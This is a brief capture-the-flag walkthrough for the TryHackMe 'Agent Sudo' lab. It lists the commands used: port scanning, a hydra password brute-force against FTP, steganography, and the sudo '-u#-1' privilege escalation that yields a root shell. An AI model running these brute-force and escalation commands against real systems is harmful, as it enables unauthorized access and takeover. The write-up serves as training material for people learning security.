# Agent Sudo

[Agent Sudo](https://tryhackme.com/room/agentsudoctf)

## Solution

Part 1.

- nmap scan 21, 22, 80

- to get the username I created a small script that changes the User-Agent

Part 2.

- hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<ip>

- we get all the files and have to do stego on them...

Part 3.

- ssh user james with the password that we got

- get the image `scp james@10.10.63.226:Alien_autospy.jpg .`

Part 4.

- we check `sudo -l`, there is bash. but we cannot run it directly

- check sudo and bash versions for some CVE: https://www.exploit-db.com/exploits/47502

Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

- we run `sudo -u#-1 /bin/bash` and get a root shell

- go to root home and cat the flag
